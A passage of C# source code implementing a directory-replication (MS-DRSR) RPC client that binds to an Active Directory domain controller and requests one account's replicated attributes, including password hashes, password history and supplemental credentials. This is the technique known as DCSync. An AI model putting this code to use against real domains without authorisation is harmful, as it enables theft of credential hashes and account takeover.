                0xc8,0xff,0x5b,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x5c,0x5b,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x0c,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x02,0x00,0x04,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x6c,0x00,0xff,0xff,0x16,0x03,0x0c,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,
                0x12,0x08,0x25,0x5c,0x46,0x5c,0x08,0x00,0x08,0x00,0x12,0x08,0x25,0x5c,0x5b,0x08,0x08,0x08,0x5c,0x5b,0x1b,0x03,0x0c,0x00,0x19,0x00,0x00,0x00,0x01,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4b,0x5c,0x48,0x49,0x0c,0x00,0x00,0x00,0x02,0x00,0x04,0x00,0x04,0x00,0x12,0x08,0x25,0x5c,0x08,0x00,
                0x08,0x00,0x12,0x08,0x25,0x5c,0x5b,0x4c,0x00,0xaf,0xff,0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x20,0xbe,0xff,0x5b,0x08,
                0x08,0x5b,0x16,0x03,0x04,0x00,0x4b,0x5c,0x46,0x5c,0x00,0x00,0x00,0x00,0x12,0x00,0xde,0xff,0x5b,0x08,0x5c,0x5b,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,
                0x04,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x04,0x00,0xff,0xff,0x16,0x03,
                0x08,0x00,0x4b,0x5c,0x46,0x5c,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x5b,0x08,0x08,0x5b,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x0c,0x00,0x01,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x04,0x00,0x01,0x00,0x00,0x00,0xa4,0x00,0x02,0x00,0x00,0x00,0x76,0x01,0x03,0x00,
                0x00,0x00,0x4a,0x02,0xff,0xff,0xff,0xff,0x9e,0x02,0xff,0xff,0x16,0x03,0x1c,0x00,0x4b,0x5c,0x46,0x5c,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,
                0x04,0x00,0x04,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x08,0x00,0x08,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x0c,0x00,0x0c,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,
                0x10,0x00,0x10,0x00,0x12,0x08,0x25,0x5c,0x5b,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x5c,0x5b,0x1b,0x03,0x1c,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,
                0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x4b,0x5c,0x48,0x49,0x1c,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x04,0x00,0x04,0x00,
                0x12,0x08,0x25,0x5c,0x08,0x00,0x08,0x00,0x12,0x08,0x25,0x5c,0x0c,0x00,0x0c,0x00,0x12,0x08,0x25,0x5c,0x10,0x00,0x10,0x00,0x12,0x08,0x25,0x5c,0x5b,0x4c,
                0x00,0x75,0xff,0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x20,0xa6,0xff,0x5b,0x08,0x08,0x5b,0x16,0x03,0x68,0x00,0x4b,0x5c,
                0x46,0x5c,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x08,0x00,0x08,0x00,0x12,0x08,0x25,0x5c,
                0x46,0x5c,0x0c,0x00,0x0c,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x10,0x00,0x10,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x14,0x00,0x14,0x00,0x12,0x08,0x25,0x5c,
                0x46,0x5c,0x18,0x00,0x18,0x00,0x12,0x08,0x25,0x5c,0x5b,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x4c,0x00,0xc1,0xf7,0x4c,0x00,0xbd,0xf7,0x4c,
                0x00,0xb9,0xf7,0x4c,0x00,0xb5,0xf7,0x5b,0x1b,0x03,0x68,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x4b,0x5c,
                0x48,0x49,0x68,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x04,0x00,0x04,0x00,0x12,0x08,0x25,0x5c,0x08,0x00,0x08,0x00,0x12,0x08,
                0x25,0x5c,0x0c,0x00,0x0c,0x00,0x12,0x08,0x25,0x5c,0x10,0x00,0x10,0x00,0x12,0x08,0x25,0x5c,0x14,0x00,0x14,0x00,0x12,0x08,0x25,0x5c,0x18,0x00,0x18,0x00,
                0x12,0x08,0x25,0x5c,0x5b,0x4c,0x00,0x3f,0xff,0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x20,0x96,0xff,0x5b,0x08,0x08,0x5b,
                0x16,0x03,0x6c,0x00,0x4b,0x5c,0x46,0x5c,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x08,0x00,
                0x08,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x0c,0x00,0x0c,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x10,0x00,0x10,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x14,0x00,
                0x14,0x00,0x12,0x08,0x25,0x5c,0x46,0x5c,0x18,0x00,0x18,0x00,0x12,0x08,0x25,0x5c,0x5b,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x4c,0x00,
                0xe8,0xf6,0x4c,0x00,0xe4,0xf6,0x4c,0x00,0xe0,0xf6,0x4c,0x00,0xdc,0xf6,0x5c,0x5b,0x1b,0x03,0x6c,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x10,0x27,0x00,0x00,0x4b,0x5c,0x48,0x49,0x6c,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x12,0x08,0x25,0x5c,0x04,0x00,0x04,0x00,0x12,0x08,
                0x25,0x5c,0x08,0x00,0x08,0x00,0x12,0x08,0x25,0x5c,0x0c,0x00,0x0c,0x00,0x12,0x08,0x25,0x5c,0x10,0x00,0x10,0x00,0x12,0x08,0x25,0x5c,0x14,0x00,0x14,0x00,
                0x12,0x08,0x25,0x5c,0x18,0x00,0x18,0x00,0x12,0x08,0x25,0x5c,0x5b,0x4c,0x00,0x3d,0xff,0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,
                0x12,0x20,0x96,0xff,0x5b,0x08,0x08,0x5b,0x16,0x03,0x1c,0x00,0x4b,0x5c,0x46,0x5c,0x18,0x00,0x18,0x00,0x12,0x08,0x25,0x5c,0x5b,0x08,0x08,0x08,0x08,0x08,
                0x08,0x08,0x5c,0x5b,0x1b,0x03,0x1c,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x4b,0x5c,0x48,0x49,0x1c,0x00,
                0x00,0x00,0x01,0x00,0x18,0x00,0x18,0x00,0x12,0x08,0x25,0x5c,0x5b,0x4c,0x00,0xbd,0xff,0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,
                0x12,0x20,0xc6,0xff,0x5b,0x08,0x08,0x5b,0x00
            };
            #endregion

            #region RPC structures
            [StructLayout(LayoutKind.Sequential)]
            private struct DRS_EXTENSIONS_INT {
	            public UInt32 cb;
	            public UInt32 dwFlags;
	            public Guid SiteObjGuid;
	            public UInt32 Pid;
	            public UInt32 dwReplEpoch;
	            public UInt32 dwFlagsExt;
                public Guid ConfigObjGUID;
	            public UInt32 dwExtCaps;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct DRS_MSG_DCINFOREQ_V1 {
                public IntPtr Domain;
                public UInt32 InfoLevel;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct DRS_MSG_DCINFOREPLY_V2
            {
                public UInt32 cItems;
                public IntPtr rItems;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct DS_DOMAIN_CONTROLLER_INFO_2W
            {
                public IntPtr NetbiosName;
                public IntPtr DnsHostName;
                public IntPtr SiteName;
                public IntPtr SiteObjectName;
                public IntPtr ComputerObjectName;
                public IntPtr ServerObjectName;
                public IntPtr NtdsDsaObjectName;
                public UInt32 fIsPdc;
                public UInt32 fDsEnabled;
                public UInt32 fIsGc;
                public Guid SiteObjectGuid;
                public Guid ComputerObjectGuid;
                public Guid ServerObjectGuid;
                public Guid NtdsDsaObjectGuid;
            }


            [StructLayout(LayoutKind.Sequential)]
            private struct USN_VECTOR
            {
                public long usnHighObjUpdate;
                public long usnReserved;
                public long usnHighPropUpdate;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct SCHEMA_PREFIX_TABLE
            {
                public UInt32 PrefixCount;
                public IntPtr pPrefixEntry;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct DSNAME
            {
                public UInt32 structLen;
                public UInt32 SidLen;
                public Guid Guid;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst=28)]
                public byte[] Sid;
                public UInt32 NameLen;
                public byte StringName;
            };

            [StructLayout(LayoutKind.Sequential)]
            private struct DRS_MSG_GETCHGREQ_V8
            {
                public Guid uuidDsaObjDest;
                public Guid uuidInvocIdSrc;
                public IntPtr pNC;
                public USN_VECTOR usnvecFrom;
                public IntPtr pUpToDateVecDest;
                public UInt32 ulFlags;
                public UInt32 cMaxObjects;
                public UInt32 cMaxBytes;
                public UInt32 ulExtendedOp;
                public ulong liFsmoInfo;
                public IntPtr pPartialAttrSet;
                public IntPtr pPartialAttrSetEx;
                public SCHEMA_PREFIX_TABLE PrefixTableDest;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct DRS_MSG_GETCHGREPLY_V6
            {
                public Guid uuidDsaObjSrc;
                public Guid uuidInvocIdSrc;
                public IntPtr pNC;
                public USN_VECTOR usnvecFrom;
                public USN_VECTOR usnvecTo;
                public IntPtr pUpToDateVecSrc;
                public SCHEMA_PREFIX_TABLE PrefixTableSrc;
                public UInt32 ulExtendedRet;
                public UInt32 cNumObjects;
                public UInt32 cNumBytes;
                public IntPtr pObjects;
                public UInt32 fMoreData;
                public UInt32 cNumNcSizeObjects;
                public UInt32 cNumNcSizeValues;
                public UInt32 cNumValues;
                public IntPtr rgValues;
                public UInt32 dwDRSError;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct DRS_MSG_CRACKREQ_V1
            {
                public UInt32 CodePage;
                public UInt32 LocaleId;
                public UInt32 dwFlags;
                public UInt32 formatOffered;
                public UInt32 formatDesired;
                public UInt32 cNames;
                public IntPtr rpNames;
            }

            [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
            private struct DS_NAME_RESULT_ITEMW
            {
                public UInt32 status;
                public IntPtr pDomain;
                public IntPtr pName;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct DS_NAME_RESULTW
            {
                public UInt32 cItems;
                public IntPtr rItems;
            }


            [StructLayout(LayoutKind.Sequential)]
            private struct ATTRVAL
            {
                public UInt32 valLen;
                public IntPtr pVal;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct ATTRVALBLOCK
            {
                public UInt32 valCount;
                public IntPtr pAVal;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct ATTR
            {
                public UInt32 attrTyp;
                public ATTRVALBLOCK AttrVal;
            }


            [StructLayout(LayoutKind.Sequential)]
            private struct ATTRBLOCK
            {
                public UInt32 attrCount;
                public IntPtr pAttr;
            }
            [StructLayout(LayoutKind.Sequential)]
            private struct ENTINF
            {
                public IntPtr pName;
                public UInt32 ulFlags;
                public ATTRBLOCK AttrBlock;
            };
            [StructLayout(LayoutKind.Sequential)]
            private struct REPLENTINFLIST
            {
                public IntPtr pNextEntInf;
                public ENTINF Entinf;
                public UInt32 fIsNCPrefix;
                public IntPtr pParentGuid;
                public IntPtr pMetaDataExt;
            }


            private enum ATT
            {
                [Description("displayName")]
                ATT_RDN = 589825,
                ATT_OBJECT_SID = 589970,
                ATT_WHEN_CREATED = 131074,
                ATT_WHEN_CHANGED = 131075,

                ATT_SAM_ACCOUNT_NAME = 590045,
                ATT_USER_PRINCIPAL_NAME = 590480,
                ATT_SERVICE_PRINCIPAL_NAME = 590595,
                ATT_SID_HISTORY = 590433,
                ATT_USER_ACCOUNT_CONTROL = 589832,
                ATT_SAM_ACCOUNT_TYPE = 590126,
                ATT_LOGON_HOURS = 589888,
                ATT_LOGON_WORKSTATION = 589889,
                [Description("lastLogon")]
                ATT_LAST_LOGON = 589876,
                ATT_PWD_LAST_SET = 589920,
                ATT_ACCOUNT_EXPIRES = 589983,
                ATT_LOCKOUT_TIME = 590486,

                ATT_UNICODE_PWD = 589914,
                ATT_NT_PWD_HISTORY = 589918,
                ATT_DBCS_PWD = 589879,
                ATT_LM_PWD_HISTORY = 589984,
                ATT_SUPPLEMENTAL_CREDENTIALS = 589949,
            }
            #endregion

            #region drsr class and public interfaces

            public drsr()
            {
                Guid interfaceId = new Guid("e3514235-4b06-11d1-ab04-00c04fc2dcd2");
                if (IntPtr.Size == 8)
                {
                    InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, 4, 0);
                }
                else
                {
                    InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, 4, 0);
                }
            }

            ~drsr()
            {
                freeStub();
                Uninitialize();
            }

            private Guid ntDSAGuid;
            private DRS_EXTENSIONS_INT extensions;
            private IntPtr hBind;

            public void Initialize(string server, string domain)
            {
                UInt32 result;
                ntDSAGuid = Guid.Empty;
                extensions = new DRS_EXTENSIONS_INT();
                IntPtr hDrs = IntPtr.Zero;
                try
                {
                    hBind = Bind(server);
                    if (hBind == IntPtr.Zero)
                        throw new Exception("Unable to connect to the server " + server);

                    DRS_EXTENSIONS_INT extensions_int = new DRS_EXTENSIONS_INT();
                    extensions_int.cb = (UInt32)(Marshal.SizeOf(typeof(DRS_EXTENSIONS_INT)) - Marshal.SizeOf(typeof(UInt32)));
                    extensions_int.dwFlags = 0x04000000 | 0x00008000;
                
                    result = DrsBind(hBind, new Guid("e24d201a-4fd6-11d1-a3da-0000f875ae0d"), extensions_int, out extensions, out hDrs);
                    if (result != 0)
                        throw new Win32Exception((int) result, "Unable to bind to Drs with generic Guid");
                    try
                    {
                        result = DrsDomainControllerInfo(hDrs, domain, server, out ntDSAGuid);
                        if (result != 0)
                            throw new Win32Exception((int)result, "Unable to get the NTDSA Guid for the DC " + server);
                    }
                    finally
                    {
                        DrsUnbind(ref hDrs);
                    }
                }
                catch(Exception)
                {

                    if (hBind != IntPtr.Zero) 
                        Unbind(hBind);
                    hBind = IntPtr.Zero;
                }
            }

            private void Uninitialize()
            {
                if (hBind != IntPtr.Zero)
                    Unbind(hBind);
            }

            public Dictionary<string, object> GetData(string account)
            {
                UInt32 result;
                Guid userGuid;
                Dictionary<int, object> ReplicationData;
                Dictionary<string, object> DecodedReplicationData;
                IntPtr hDrs = IntPtr.Zero;
                DRS_EXTENSIONS_INT extensions_out;

                if (hBind == IntPtr.Zero)
                    throw new Exception("The class has not been initialized");

                result = DrsBind(hBind, ntDSAGuid, extensions, out extensions_out, out hDrs);
                if (result != 0)
                {
                    throw new Win32Exception((int)result, "Unable to bind to the DC with the NTDSA guid " + ntDSAGuid);
                }
                try
                {
                    result = CrackNameGetGuid(hDrs, account, out userGuid);
                    if (result != 0)
                        throw new Win32Exception((int)result, "Unable to crack the account " + account);
                    result = GetNCChanges(hDrs, ntDSAGuid, userGuid, out ReplicationData);
                    if (result != 0)
                        throw new Win32Exception((int)result, "Unable to get the replication changes for " + account);
                }
                finally
                {
                    DrsUnbind(ref hDrs);
                }
                DecodeReplicationFields(ReplicationData, out DecodedReplicationData);
                return DecodedReplicationData;
            }
            #endregion

            #region drsr rpc functions and decoding functions

            private UInt32 DrsBind(IntPtr hBinding, Guid NtdsDsaObjectGuid, DRS_EXTENSIONS_INT extensions_in, out DRS_EXTENSIONS_INT extensions_out, out IntPtr hDrs)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pDrsExtensionsExt = IntPtr.Zero;
                hDrs = IntPtr.Zero;
                EnableMemoryTracking();
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(0), __arglist(hBinding, NtdsDsaObjectGuid, extensions_in, out pDrsExtensionsExt, out hDrs));
                    }
                    else
                    {
                        GCHandle handle1 = GCHandle.Alloc(NtdsDsaObjectGuid, GCHandleType.Pinned);
                        IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                        GCHandle handle2 = GCHandle.Alloc(extensions_in, GCHandleType.Pinned);
                        IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                        IntPtr tempValue3 = IntPtr.Zero;
                        GCHandle handle3 = GCHandle.Alloc(tempValue3, GCHandleType.Pinned);
                        IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                        IntPtr tempValue4 = IntPtr.Zero;
                        GCHandle handle4 = GCHandle.Alloc(tempValue4, GCHandleType.Pinned);
                        IntPtr tempValuePointer4 = handle4.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(0, hBinding, tempValuePointer1, tempValuePointer2, tempValuePointer3, tempValuePointer4);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            pDrsExtensionsExt = Marshal.ReadIntPtr(tempValuePointer3);
                            hDrs = Marshal.ReadIntPtr(tempValuePointer4);
                        }
                        finally
                        {
                            handle1.Free();
                            handle2.Free();
                            handle3.Free();
                            handle4.Free();
                        }
                    }
                    extensions_out = extensions_in;
                    DRS_EXTENSIONS_INT extensions_out_temp = (DRS_EXTENSIONS_INT)Marshal.PtrToStructure(pDrsExtensionsExt, typeof(DRS_EXTENSIONS_INT));
                    if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "SiteObjGuid").ToInt32())
                    {
                        extensions_out.SiteObjGuid = extensions_out_temp.SiteObjGuid;
                        if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "dwReplEpoch").ToInt32())
                        {
                            extensions_out.dwReplEpoch = extensions_out_temp.dwReplEpoch;
                            if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "dwFlagsExt").ToInt32())
                            {
                                extensions_out.dwFlagsExt = extensions_out_temp.dwFlagsExt & 4;
                                if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "ConfigObjGUID").ToInt32())
                                {
                                    extensions_out.ConfigObjGUID = extensions_out_temp.ConfigObjGUID;
                                }
                            }
                        }
                    }
                }
                catch (SEHException)
                {
                    extensions_out = new DRS_EXTENSIONS_INT();
                    int ex = Marshal.GetExceptionCode();
                    return (UInt32)ex;
                }
                finally
                {
                    FreeTrackedMemoryAndRemoveTracking();
                }
                return (UInt32)result.ToInt64();
            }

            private UInt32 DrsUnbind(ref IntPtr hDrs)
            {
                IntPtr result = IntPtr.Zero;
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(60), __arglist(ref hDrs));
                    }
                    else
                    {
                        GCHandle handle1 = GCHandle.Alloc(hDrs, GCHandleType.Pinned);
                        IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(58, tempValuePointer1);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            hDrs = Marshal.ReadIntPtr(tempValuePointer1);
                        }
                        finally
                        {
                            handle1.Free();
                        }
                    }
                }
                catch (SEHException)
                {
                    int ex = Marshal.GetExceptionCode();
                    return (UInt32)ex;
                }
                finally
                {
                }
                return (UInt32)result.ToInt64();
            }

            private UInt32 DrsDomainControllerInfo(IntPtr hDrs, string domain, string serverName, out Guid NtdsDsaObjectGuid)
            {
                IntPtr result = IntPtr.Zero;
                DRS_MSG_DCINFOREQ_V1 dcInfoReq = new DRS_MSG_DCINFOREQ_V1();
                dcInfoReq.InfoLevel = 2;
                dcInfoReq.Domain = Marshal.StringToHGlobalUni(domain);
                UInt32 dcOutVersion;
                UInt32 dcInVersion = 1;
                DRS_MSG_DCINFOREPLY_V2 dcInfoRep = new DRS_MSG_DCINFOREPLY_V2();
                EnableMemoryTracking();
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(600), __arglist(hDrs, dcInVersion, dcInfoReq, out dcOutVersion, ref dcInfoRep));
                    }
                    else
                    {
                        GCHandle handle1 = GCHandle.Alloc(dcInfoReq, GCHandleType.Pinned);
                        IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                        IntPtr tempValue2 = IntPtr.Zero;
                        GCHandle handle2 = GCHandle.Alloc(tempValue2, GCHandleType.Pinned);
                        IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                        GCHandle handle3 = GCHandle.Alloc(dcInfoRep, GCHandleType.Pinned);
                        IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(568, hDrs, new IntPtr(dcInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            dcOutVersion = (UInt32) Marshal.ReadInt32(tempValuePointer2);
                            dcInfoRep = (DRS_MSG_DCINFOREPLY_V2) Marshal.PtrToStructure(tempValuePointer3, typeof(DRS_MSG_DCINFOREPLY_V2));
                        }
                        finally
                        {
                            handle1.Free();
                            handle2.Free();
                            handle3.Free();
                        }
                    }
                    NtdsDsaObjectGuid = GetDsaGuid(dcInfoRep, serverName);
                }
                catch (SEHException)
                {
                    NtdsDsaObjectGuid = Guid.Empty;
                    int ex = Marshal.GetExceptionCode();
                    return (UInt32)ex;
                }
                finally
                {
                    Marshal.FreeHGlobal(dcInfoReq.Domain);
                    FreeTrackedMemoryAndRemoveTracking();
                }
                return (UInt32)result.ToInt64();
            }

            private Guid GetDsaGuid(DRS_MSG_DCINFOREPLY_V2 dcInfoRep, string server)
            {
                Guid OutGuid = Guid.Empty;
                int size = Marshal.SizeOf(typeof(DS_DOMAIN_CONTROLLER_INFO_2W));
                for (uint i = 0; i < dcInfoRep.cItems; i++)
                {
                    DS_DOMAIN_CONTROLLER_INFO_2W info = (DS_DOMAIN_CONTROLLER_INFO_2W)Marshal.PtrToStructure(new IntPtr(dcInfoRep.rItems.ToInt64() + i * size), typeof(DS_DOMAIN_CONTROLLER_INFO_2W));
                    string infoDomain = Marshal.PtrToStringUni(info.DnsHostName);
                    string infoNetbios = Marshal.PtrToStringUni(info.NetbiosName);
                    if (server.StartsWith(infoDomain, StringComparison.InvariantCultureIgnoreCase) || server.StartsWith(infoNetbios, StringComparison.InvariantCultureIgnoreCase))
                    {
                        OutGuid = info.NtdsDsaObjectGuid;
                    }
                }
                return OutGuid;
            }


            private UInt32 CrackNameGetGuid(IntPtr hDrs, string Name, out Guid userGuid)
            {
                IntPtr result = IntPtr.Zero;
                userGuid = Guid.Empty;

                DRS_MSG_CRACKREQ_V1 dcInfoReq = new DRS_MSG_CRACKREQ_V1();
                if (Name.Contains("\\"))
                    dcInfoReq.formatOffered = 2;
                else if (Name.Contains("="))
                    dcInfoReq.formatOffered = 1;
                else if (Name.Contains("@"))
                    dcInfoReq.formatOffered = 8;
                else
                    dcInfoReq.formatOffered = 0xfffffff9;
                dcInfoReq.formatDesired = 6;
                dcInfoReq.cNames = 1;
                IntPtr NameIntPtr = Marshal.StringToHGlobalUni(Name);
                GCHandle handle = GCHandle.Alloc(NameIntPtr, GCHandleType.Pinned);
                dcInfoReq.rpNames = handle.AddrOfPinnedObject();

                IntPtr dcInfoRep = IntPtr.Zero;
                UInt32 dcInVersion = 1;
                UInt32 dcOutVersion = 0;
                EnableMemoryTracking();
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(442), __arglist(hDrs, dcInVersion, dcInfoReq, out dcOutVersion, ref dcInfoRep));
                    }
                    else
                    {
                        GCHandle handle1 = GCHandle.Alloc(dcInfoReq, GCHandleType.Pinned);
                        IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                        IntPtr tempValue2 = IntPtr.Zero;
                        GCHandle handle2 = GCHandle.Alloc(tempValue2, GCHandleType.Pinned);
                        IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                        GCHandle handle3 = GCHandle.Alloc(dcInfoRep, GCHandleType.Pinned);
                        IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(418, hDrs, new IntPtr(dcInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            dcOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                            dcInfoRep = Marshal.ReadIntPtr(tempValuePointer3);
                        }
                        finally
                        {
                            handle1.Free();
                            handle2.Free();
                            handle3.Free();
                        }
                    }
                    if (result == IntPtr.Zero)
                    {
                        userGuid = ReadGuidFromCrackName(dcInfoRep);
                        if (userGuid == Guid.Empty)
                        {
                            result = new IntPtr(2); // not found
                        }
                    }
                }
                catch (SEHException)
                {
                    int ex = Marshal.GetExceptionCode();
                    return (UInt32)ex;
                }
                finally
                {
                    handle.Free();
                    FreeTrackedMemoryAndRemoveTracking();
                }
                return (UInt32)result.ToInt64();
            }

            private Guid ReadGuidFromCrackName(IntPtr dcInfoRep)
            {
                DS_NAME_RESULTW result = (DS_NAME_RESULTW) Marshal.PtrToStructure(dcInfoRep, typeof(DS_NAME_RESULTW));
                if (result.cItems >= 1)
                {
                    DS_NAME_RESULT_ITEMW item = (DS_NAME_RESULT_ITEMW)Marshal.PtrToStructure(result.rItems, typeof(DS_NAME_RESULT_ITEMW));
                    if (item.status != 0)
                    {
                        Trace.WriteLine("Error " + item.status + " when cracking the name");
                        return Guid.Empty;
                    }
                    else
                    {
                        string guidString = Marshal.PtrToStringUni(item.pName);
                        return new Guid(guidString);
                    }
                }
                else
                {
                    return Guid.Empty;
                }
            
            }

            private UInt32 GetNCChanges(IntPtr hDrs, Guid ntDSAGuid, Guid Userguid, out Dictionary<int, object> ReplicationData)
            {
                IntPtr result = IntPtr.Zero;
                ReplicationData = null;
                UInt32 dwInVersion = 8;
                UInt32 dwOutVersion = 0;
                DRS_MSG_GETCHGREQ_V8 pmsgIn = new DRS_MSG_GETCHGREQ_V8();
                DRS_MSG_GETCHGREPLY_V6 pmsgOut = new DRS_MSG_GETCHGREPLY_V6();
                DSNAME dsName = new DSNAME();
                dsName.Guid = Userguid;
                EnableMemoryTracking();
                try
                {
                    Trace.WriteLine("GetNCChanges"); 
                
                    IntPtr unmanageddsName = AllocateMemory(Marshal.SizeOf(typeof(DSNAME)));
                    Marshal.StructureToPtr(dsName, unmanageddsName, true);
                    pmsgIn.pNC = unmanageddsName;
                    pmsgIn.ulFlags = 0x00000020 | 0x00000010 | 0x00200000 | 0x00008000 | 0x00080000;
                    pmsgIn.cMaxObjects = 1;
                    pmsgIn.cMaxBytes = 0x00a00000; // 10M
                    pmsgIn.ulExtendedOp = 6;
                    pmsgIn.uuidDsaObjDest = ntDSAGuid;
                
                    if (IntPtr.Size == 8)
                    {
                        result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(134), __arglist(hDrs, dwInVersion, pmsgIn, out dwOutVersion, ref pmsgOut));
                    }
                    else
                    {
                        GCHandle handle1 = GCHandle.Alloc(pmsgIn, GCHandleType.Pinned);
                        IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                        GCHandle handle2 = GCHandle.Alloc(dwOutVersion, GCHandleType.Pinned);
                        IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                        GCHandle handle3 = GCHandle.Alloc(pmsgOut, GCHandleType.Pinned);
                        IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(128, hDrs, new IntPtr(dwInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            dwOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                            pmsgOut = (DRS_MSG_GETCHGREPLY_V6) Marshal.PtrToStructure(tempValuePointer3, typeof(DRS_MSG_GETCHGREPLY_V6));
                        }
                        finally
                        {
                            handle1.Free();
                            handle2.Free();
                            handle3.Free();
                        }
                    }
                    MarshalReplicationData(pmsgOut, out ReplicationData);
                }
                catch (SEHException)
                {
